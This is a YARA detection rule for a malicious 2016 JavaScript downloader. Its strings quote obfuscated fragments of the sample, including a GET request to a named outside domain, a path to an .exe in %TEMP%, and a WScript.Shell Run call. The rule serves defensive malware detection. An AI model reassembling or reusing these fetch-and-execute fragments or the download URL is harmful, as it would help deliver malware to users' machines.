rule sig_20160328_be1ef90db619aaafa5632705476245ec {
  meta:
    description = "datamaliciousorder - file 20160328_be1ef90db619aaafa5632705476245ec.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3493f3bff711c6575e3acd231ab4ddab3debc38636e482dd9b85355cba913242"

  strings:
    $s1  = "function Uwjnkbh() {return Xjimr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9kRAiodg3aWub.exe\";};" fullword ascii
    $s2  = "do {WScript[Glkycsrsua](Dggqldckc() * 11)} while (Syeuzeyh[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Yapzxsv(Epbhb, Omnjzsblt){return Epbhb - Omnjzsblt;};" fullword ascii
    $s4  = "Syeuzeyh[Fhgsnkmyi](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s5  = "var Xjimr = function Wrcqahgyqd() {return WScript[Nunzpfml](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ndgujubvqm()" fullword ascii
    $s7  = "var Pwpmfu = false;" fullword ascii
    $s8  = "var Lylwmgvbvg = new this[\"Date\"]();" fullword ascii
    $s9  = " while (Mnjhqjz){" fullword ascii
    $s10 = "function Pjsxbkg(){return Nunzpfml;};" fullword ascii
    $s11 = "var Kijkzxjvqx = false;" fullword ascii
    $s12 = "function Jdaqnbkq(Qbuceimw) {var Bzmsabot = (1, 2, 3, 4, 5, Qbuceimw); return Bzmsabot;};" fullword ascii
    $s13 = "return Yapzxsv(Kcmlnk, Hffatxdz);" fullword ascii
    $s14 = "function Dggqldckc(){return 22;};" fullword ascii
    $s15 = "function Jcqzzqjryr(){return Ubfym;};" fullword ascii
    $s16 = "Kijkzxjvqx = true; " fullword ascii
    $s17 = "function Pbdnfxsp(Nsyhyceghq){Xjimr[\"Run\"](Nsyhyceghq, Rumkvvcawj, Rumkvvcawj);};" fullword ascii
    $s18 = "function Ldntdblo() {return ((Kijkzxjvqx == true) && (Kijkzxjvqx == Oofkfjcawp)) ? 1 : Rumkvvcawj;};" fullword ascii
    $s19 = "var Oofkfjcawp = false;" fullword ascii
    $s20 = "} catch(Awhpvckbq){Mnjhqjz = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}